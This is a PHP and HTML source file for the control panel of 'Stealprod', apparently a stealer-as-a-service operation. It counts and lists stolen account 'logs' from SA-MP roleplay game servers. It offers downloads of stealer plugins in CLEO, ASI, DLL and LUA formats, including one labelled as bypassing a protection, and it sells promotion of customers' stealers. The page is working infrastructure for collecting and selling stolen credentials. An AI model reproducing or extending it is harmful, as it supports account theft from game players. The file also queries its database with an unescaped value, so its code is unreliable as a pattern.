<?php
//error_reporting(E_ALL);
//ini_set('display_errors', 1);

session_start();
include './php/safemysql.php';
$db = new SafeMySQL();

if (!isset($_SESSION['login'])) echo '<script> window.location="login"; </script>';

if (isset($_SESSION['login']))
{
	$login = $_SESSION['login'];
	$sql = "SELECT * FROM `users` WHERE `login` = ?s";
	$userdata = $db->getRow($sql, $login);

	$nickname = $userdata['nickname'];
	$balance = $userdata['balance'];

	$asi = $userdata['asi'];
	$cs = $userdata['cs'];
	$sf = $userdata['sf'];
	$dll = $userdata['dll'];
	$lua = $userdata['lua'];

	$topserver = $userdata['topserv'];
	$topdialogs = $userdata['topdid'];
	$nonerepeat = $userdata['repeatoff'];

	$_SESSION['topserv'] = $topserver;
	$_SESSION['topdid'] = $topdialogs;
	$_SESSION['offrepeat'] = $nonerepeat;
	$_SESSION['balance'] = $balance;


	$_SESSION['asi'] = $asi;
	$_SESSION['cs'] = $cs;
	$_SESSION['dll'] = $dll;
	$_SESSION['lua'] = $lua;
	$_SESSION['sf'] = $sf;

	$id = $userdata['id'];
	$vkact = $userdata['vkkeys'];
	$logcount = $userdata['logs'];
	$_SESSION['logcount'] = $logcount;
	$size = $userdata['length'];

	if ($vkact == 'activated') {
		$vkstatus = 'Привязан';
	}
	else {
		$vkstatus = 'Не привязан';
	}

	$nowtime = date("d.m");
	$yerstadaytime = date("d.m", strtotime("-1 DAY"));
	$weeklogarray = array(
		0  => $nowtime,
		1  => $yerstadaytime,
		2  => date("d.m", strtotime("-2 DAY")),
		3  => date("d.m", strtotime("-3 DAY")),
		4  => date("d.m", strtotime("-4 DAY")),
		5  => date("d.m", strtotime("-5 DAY")),
		6  => date("d.m", strtotime("-6 DAY")),
	);

	if ($logcount !== 0) {
		// Рабочий счетчик логов за сегодня, вчера и неделю.
		$logs = $db->getAll("SELECT * FROM `logs` WHERE `id` = '$id'");
		$n = 0;
		$y = 0;
		$w = 0;
		foreach ($logs as $key) {
			$date = $key['date'];
			$search = strpos($date, $nowtime);
			if ($search !== false) {
				$n++;
			}
			else {
				$search = strpos($date, $yerstadaytime);
				if ($search !== false) {
					$y++;
				}
				else {
					$search = strpos($date, $weeklogarray[2]);
					if ($search !== false) {
						$w++;
					}
					else {
						$search = strpos($date, $weeklogarray[3]);
						if ($search !== false) {
							$w++;
						}
						else {
							$search = strpos($date, $weeklogarray[4]);
							if ($search !== false) {
								$w++;
							}
							else {
								$search = strpos($date, $weeklogarray[5]);
								if ($search !== false) {
									$w++;
								}
								else {
									$search = strpos($date, $weeklogarray[6]);
									if ($search !== false) {
										$w++;
									}
								}
							}
						}
					}
				}
			}
		}

// Конец счетчика
	}


	if ($_GET['act'] == "logout")
	{
		unset($_SESSION['id']);
		unset($_SESSION['login']);
		unset($_SESSION['logcount']);
		unset($_SESSION['asi']);
		unset($_SESSION['cs']);
		unset($_SESSION['dll']);
		unset($_SESSION['lua']);
		unset($_SESSION['sf']);
		session_destroy();
		echo '<script> window.location="login"; </script>';
	}


}

?>

<!doctype html>
<html lang="RU">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Личный кабинет - Stealprod</title>
    <link rel="stylesheet" href="./css/bootstrap.css">
    <link rel="stylesheet" href="./css/styles.css">
</head>
<body onload="ajax_get_data(1)">
    <div class="loader"></div>
    <div class="lk_bg"></div>
    <div class="glitch-effect"></div>
    <header>
        <div class="container lk-container">
            <nav class="navbar navbar-expand-lg justify-content-between">
                <a href="/" class="navbar-brand">Stealprod<span id="point">.</span></a>
                <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
                    <div class="navbar-nav">
                        <a class="nav-item nav-link active" href="/cp">
                            Панель управления
                            <span id="line" style="background-color: #176091; box-shadow: 0px 3px 14px rgba(95,111,203,24);"></span>
                          </a>
                        <a class="nav-item nav-link" href="/stats">
                          Статистика
                          <span id="line" style="background-color: #176091; box-shadow: 0px 3px 14px rgba(95,111,203,24);"></span>
                        </a>
                        <a class="nav-item nav-link" href="/gides">
                          Гайды
                          <span id="line" style="background-color: #176091; box-shadow: 0px 3px 14px rgba(95,111,203,24);"></span>
                        </a>
                        <a class="nav-item nav-link" href="https://vk.me/join/IcJbyqvPIYcBFwUcCgBqgCtyrgYdygYxQ1k=">
                          Беседа
                          <span id="line" style="background-color: #176091; box-shadow: 0px 3px 14px rgba(95,111,203,24);"></span>
                        </a>
                        
                    </div>
                </div>
                <a class="nav-item nav-link btn-auth" href="?act=logout">
                    Выход
                    <span id="line" style="background-color: #176091; box-shadow: 0px 3px 14px rgba(95,111,203,24);"></span>
                  </a>
                
            </nav>
        </div>
    </header>

    <section class="lk">
        <div class="container lk-container">
            <div class="row">
                <div class="col-md-2">
                    <div class="side_bar">
                        <div class="nickname"><?php echo $nickname ?></div>
                        <div class="panel_info">
                            <div class="text_info">ID базы: <span class="bold"><?php echo $id ?></span></div>
                            <div class="text_info">Баланс: <span class="bold"><?php echo $balance ?></span></div>
                        </div>
                        <div class="access_format">Доступные форматы: <br>
                            <span class="greenlight">
                                <?php
                                if($cs == 1) echo "CS, ";
                                if($asi == 1) echo "ASI, ";
                                if($sf == 1) echo "SF, ";
                                if($dll == 1) echo "DLL, ";
                                if($lua == 1) echo "LUA ";
                                ?>
                            </span>
                        </div>
                        <div class="group_button">
                            <button name="dl__steal" class="btn-dl">Скачать плагины</button>
                            <button name="nickname" class="btn-tool mb-24">Смена никнейма</button>
                            <button name="password" class="btn-tool mb-24">Смена пароля</button>
                            <button name="balance" class="btn-tool mb-24">Пополнение баланса</button>
                            <a href="?act=logout" class="btn-lk">Выход</a>
                        </div>
                    </div>
                </div>
                <div class="main_lk col-md-9">
                    <h3>Привет, <span class="bold"><?php echo $nickname ?></span>. Вот свежая статистика по твоей панели. </h3>
                    <div class="stat_blocks">
                        <div class="stat_card">
                            <h4 class="stat_card_head">Логов за сегодня</h4>
                            <div class="count_logs">+<?php echo $n ?></div>
                            <p class="info">Кстати, это на <?php if($n > $y) { echo $n-$y; } else { echo $y-$n; } ?> логов <span class="green"><?php if($n > $y) { echo "больше"; } else { echo "меньше"; } ?></span>
                                чем вчера</p>
                        </div>
                        <div class="stat_card">
                            <h4 class="stat_card_head">Логов за вчера</h4>
                            <div class="count_logs">+<?php echo $y ?></div>
                            <p class="info">Ровно столько тебе пришло
                                c 0:00 по 23:59 вчера</p>
                        </div>
                        <div class="stat_card">
                            <h4 class="stat_card_head">Логов за неделю</h4>
                            <div class="count_logs">+<?php echo $n+$y+$w; ?></div>
                            <p class="info">Столько строк логов ты получил за последние <span class="green">7 дней!</span></p>
                        </div>
                        <div class="stat_card">
                            <h4 class="stat_card_head">Логов за всё время</h4>
                            <div class="count_logs">+<?php echo $logcount ?></div>
                            <p class="info"><?php if($logcount > 60000) { echo "Ваше хранилище скоро будет
                                <span class=\"red\">заполнено</span>, советуем очистить
                                старые логи."; } else { echo "Ваше хранилище ещё не заполнено."; } ?></p>
                        </div>
                        <a href="/stats" class="btn-main">Больше статистики</a>
                    </div>

                    <h2>Логи</h2>
                    <div class="menu_logs">
                        <div class="date_filter">
                            <a href="" class="filter_item active_green">
                                Всё время
                            </a>
                            <a class="filter_item" onclick="ajax_get_filter('today', 1);" style="cursor: pointer;">
                                Сегодня
                            </a>
                            <a class="filter_item" onclick="ajax_get_filter('yerstaday', 1);" style="cursor: pointer;">
                                Вчера
                            </a>
                        </div>
                        <div class="another_setting">
                            <button name="antispam" class="btn-tool">Черный список</button>
                            <button name="notifications" class="btn-tool">Настроить логи</button>
                            <button name="clogs" class="btn-delete">Очистить логи</button>
                            <button name="dl__logs" class="btn-dl">Скачать логи</button>
                            <button name="filter" class="btn-search">Поиск строк по параметрам</button>
                        </div>
                    </div>
                    <div class="logs_dashboard">
                        <?php if($logcount == 0) {?>
                            <div class="logs_string">
                                <div style="color: #fff; text-align: center; margin: 0 auto;">Ваш лог пуст :(</div>
                            </div>
                        <?php } else {?>
                            <div id="data">
                            </div>
                        <?php } ?>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Настройки логов -->
    <div class="modal-wrapper notifysettings">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Настройки логов<span></span></h2>
                <h3 id="setinfo">Выберите какие логи будут отображаться в панели</h3>
                <form name="settingsForm">
                    <div class="settings-content">
                        <div class="settings-wrapper" name="settings">

                            <div class="setting <?php if ($topserver == 1) echo "active"; ?>" id="topservers">
                                <p>Только популярные сервера</p>
                                <div class="selector"></div>
                            </div>

                            <div class="setting <?php if ($topdialogs == 1) echo "active"; ?>" id="topdids">
                                <p>Только важные диалоги</p>
                                <div class="selector"></div>
                            </div>

                            <div class="setting <?php if ($nonerepeat == 1) echo "active"; ?>" id="nonrep">
                                <p>Не отображать повторения</p>
                                <div class="selector"></div>
                            </div>

                            <!--<div class="setting" data-name="c_rent">
								<p>Не отображать 1 лвл</p>
								<div class="selector"></div>
							</div>

							<div class="setting" data-name="c_help">
								<p>Не отображать аккаунты с менее 100.000$</p>
								<div class="selector"></div>
							</div> -->

                        </div>

                    </div>
                    <button name="set__button">Применить</button>
                </form>
            </div>
        </div>
    </div>
    <!-- Настройки логов конец -->



    <!-- Смена пароля -->
    <div class="modal-wrapper password settings">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Смена пароля</h2>
                <h3>Для смены пароля на балансе должно быть 50 рублей. Чтобы пополнить баланс отпиши <a href="https://vk.com/iwuds">Fermin'у (кликабельно)</a>
                    <h3 id="pwdinfo"></h3>
                    <form action name="passwordForm">
                        <div class="input animated" name="oldpassword">
                            <div class="icon"></div>
                            <input name="oldpassword__inp" autofocus="" maxlength="100" autocomplete="off" type="password" title="Минимум 6 символов" required placeholder="Введите текущий пароль">
                            <div class="alert animated" style="display:none;"><i class="fa fa-ban" aria-hidden="true"></i></div>
                        </div>
                        <div class="input animated" name="newpassword">
                            <div class="icon"></div>
                            <input name="newpassword__inp" autofocus="" maxlength="100" autocomplete="off" type="password" title="Минимум 6 символов" required placeholder="Введите новый пароль">
                            <div class="alert animated" style="display:none;"><i class="fa fa-ban" aria-hidden="true"></i></div>
                        </div>
                        <div class="input animated" name="renewpassword">
                            <div class="icon"></div>
                            <input name="newpasswordrepeat__inp" autofocus="" maxlength="100" autocomplete="off" type="password" title="Минимум 6 символов" required placeholder="Повторите новый пароль">
                            <div class="alert animated" style="display:none;"><i class="fa fa-ban" aria-hidden="true"></i></div>
                        </div>
                        <button type="submit" name="password__button">Сменить</button>
                    </form>
                    <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец смены пароля -->

    <!-- Смена ника -->
    <div class="modal-wrapper nickname settings">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Смена ника</h2>
                <h3 id="nickinfo"></h3>
                <form name="nicknameForm">
                    <div class="input animated" name="name">
                        <div class="icon"></div>
                        <input name="nickname__inp" autofocus="" maxlength="100" autocomplete="off" type="text" title="Введите ник" required placeholder="Введите ник">
                        <div class="alert animated" style="display:none;"><i class="fa fa-ban" aria-hidden="true"></i></div>
                    </div>
                    <button name="nickname__button">Сменить</button>
                </form>
                <div class="img blank"></div>
            </div>
        </div>
    </div>
    <!-- Конец смены ника -->

    <!-- Привязка вк -->
    <div class="modal-wrapper vk settings">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
				<? if ($vkact !== 'activated') { ?>
                    <h2>Привязка вк</h2>
                    <form name="vkFormPr">
                        <h4>Для привязки вк к панели, отправьте ваш ключ активации в личные сообщения сообщества SP. Ваш ключ: <? echo $vkact; ?></h4>
                        <button name="vkPr">Отправить</button>
                    </form>

                    <div style="display: none;">
                        <h2>Привязка вк</h2>
                        <h3 id="vkout">Ваша панель уже привязана к Вконтакте.</h3>
                        <form name="vkFormOt">
                            <button name="vk__button">Отвязать</button>
                        </form>
                    </div>
				<? } else { ?>
                    <div style="display: none;">
                        <h2>Привязка вк</h2>
                        <form name="vkFormPr">
                            <p>Для привязки вк к панели, отправьте ваш ключ активации в личные сообщения сообщества SP. Ваш ключ: <b><? echo $vkact; ?></b>, затем обновите эту страницу.</p>
                            <button name="vkPr">Отправить</button>
                        </form>
                    </div>

                    <h2>Привязка вк</h2>
                    <h3 id="vkout">Ваша панель уже привязана к Вконтакте.</h3>
                    <form name="vkFormOt">
                        <button name="vk__button">Отвязать</button>
                    </form>
				<? } ?>
                <div class="img blank"></div>
            </div>
        </div>
    </div>
    <!-- Конец привязки вк -->

    <!-- Пополнение баланса -->
    <div class="modal-wrapper balance settings">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Докупка формата</h2>
                <h3>Желаешь дополнить свою панель новыми форматами? Ты можешь приобрести эту услугу у <a href="https://vk.com/iwuds">Фермина</a></h3>
                <a href="https://vk.com/iwuds">Связаться</a>
                <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец смены ника -->

    <!-- Пополнение баланса -->
    <div class="modal-wrapper addchar">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Пиар стиллера</h2>
                <h3>Вы можете заказать пиар вашего стиллера у Фермина.</h3>
                <a href="https://vk.com/iwuds">Связаться</a>
                <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец смены ника -->



    <div class="modal-wrapper email">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Привязать электронный адрес</h2>
                <form id="emailForm">
                    <div class="input animated" name="email">
                        <div class="icon"></div>
                        <input autofocus="" type="email" required="" placeholder="Введите Email">
                        <div class="alert animated" style="display:none;"><i class="fa fa-ban" aria-hidden="true"></i></div>
                    </div>
                    <input type="hidden" name="key" value="9f3f39e7a0c96e2f58f418a950b03273">
                    <button type="submit" value="Add">Привязать</button>
                </form>
                <div class="img email"></div>
            </div>
        </div>
    </div>

    <!-- Очистка логов -->
    <div class="modal-wrapper clearlogs">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Вы действительно хотите очистить логи?</h2>
                <form name="logsClear">
                    <button name="clear__button">Да, очистить</button>
                </form>
                <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец очистки логов -->

    <!-- Скачать логи -->
    <div class="modal-wrapper dlogs">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Какие логи вы хотите скачать?</h2>

                <a class="a-button" href="/php/download.php?file=logs" target="_blank">Скачать все логи</a>
                <a class="a-button" href="/php/download.php?file=arizona" target="_blank">Скачать логи Arizona</a>
                <a class="a-button" href="/php/download.php?file=drp" target="_blank">Скачать логи Diamond</a>
                <a class="a-button" href="/php/download.php?file=srp" target="_blank">Скачать логи Samp-Rp</a>
                <a class="a-button" href="/php/download.php?file=arp" target="_blank">Скачать логи Advance</a>
                <a class="a-button" href="/php/download.php?file=evolve" target="_blank">Скачать логи Evolve</a>
                <a class="a-button" href="/php/download.php?file=trinity" target="_blank">Скачать логи Trinity</a>
                <a class="a-button" href="/php/download.php?file=today" target="_blank">Скачать логи за сегодня</a>
                <a class="a-button" href="/php/download.php?file=yersterday" target="_blank">Скачать логи за вчера</a>

                <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец скачать логи -->

    <!-- Скачать плагины -->
    <div class="modal-wrapper dl__steal">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Выберите скачиваемый формат</h2>

				<? if ($cs == 1) { ?>
                    <a class="a-button" href="/php/download.php?file=plugin&format=cs" target="_blank">Скачать CLEO</a>
				<? } if ($asi == 1) {?>
                    <a class="a-button" href="/php/download.php?file=plugin&format=asi" target="_blank">Скачать ASI</a>
				<? } if ($sf == 1) { ?>
                    <a class="a-button" href="/php/download.php?file=plugin&format=sf" target="_blank">Скачать SF</a>
				<? } if ($dll == 1) { ?>
                    <a class="a-button" href="/php/download.php?file=plugin&format=dll" target="_blank">Скачать DLL</a>
				<? } if ($lua == 1) { ?>
                    <a class="a-button" href="/php/download.php?file=plugin&format=lua1" target="_blank">Скачать LUA (без обхода DP)</a>
                    <a class="a-button" href="/php/download.php?file=plugin&format=lua2" target="_blank">Скачать LUA (DP 5.2.5 pass)</a>
				<? } ?>

                <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец скачать плагины -->

    <!-- Фильтр -->
    <div class="modal-wrapper filter" id="filter-modal">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Введите строку для поиска</h2>
                <form name="filterForm">
                    <div class="input animated" name="renewpassword">
                        <input name="filter__inp" autofocus="" type="text" required="" placeholder="Введите сроку для поиска" title="Введите сроку для поиска">
                    </div>
                    <button name="filterButton" onclick="filter();">Показать</button>
                </form>
                <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец фильтра -->

    <!-- Антиспам -->
    <div class="modal-wrapper antispam">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Укажите IP аккаунта спамера:</h2>
                <div id="resban" style="font-size: 11px;"></div>
                <form name="banIp">
                    <div class="input animated" name="renewpassword">
                        <input name="banip__inp" autofocus="" type="text" required="" placeholder="Введите IP" title="Введите IP">
                    </div>
                    <button name="ban__button">Заблокировать</button>
                </form>
                <br>
                <h2>Уже заблокированы:</h2><br>
                <table>
                    <tbody><tr><?PHP
						$echoban = "";
						$bans = $db->getAll("SELECT blacklist FROM users WHERE id = ?s", $id);
						foreach ($bans as $key) {
							$log = $key['blacklist'];
							$banl = str_replace(";", "</td></tr><tr><td>", $log);
							$echoban = "<tr><td>$banl";
							echo iconv('CP1251', 'UTF-8//IGNORE', $echoban);
						}?></tr></tbody></table><br>
                <h2>Обнулить бан-лист:</h2>
                <div id="resunban"></div>
                <form name="unbanIp">
                    <button name="unban__button">Очистить бан-лист</button>
                </form>
                <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец антиспама -->

    <!-- Антиспам -->
    <div class="modal-wrapper reg">
        <div class="modal-content-wrapper">
            <div class="closer"></div>
            <div class="modal-content">
                <div class="closer-icon"></div>
                <h2>Укажите IP аккаунта:</h2>
                <form name="checkIp">
                    <div class="input animated" name="renewpassword">
                        <input name="checkip__inp" autofocus="" type="text" required="" placeholder="Введите IP" title="Введите IP">
                    </div>
                    <button name="checkip__button">Показать рег. данные</button>
                </form>
                <div id="ipinfo"></div>
                <div class="img password"></div>
            </div>
        </div>
    </div>
    <!-- Конец антиспама -->

    <script src="./js/jquery-3.6.0.min.js"></script>
    <script src="./js/main.js"></script>
    <script src="./js/logs.js"></script>
</body>
</html>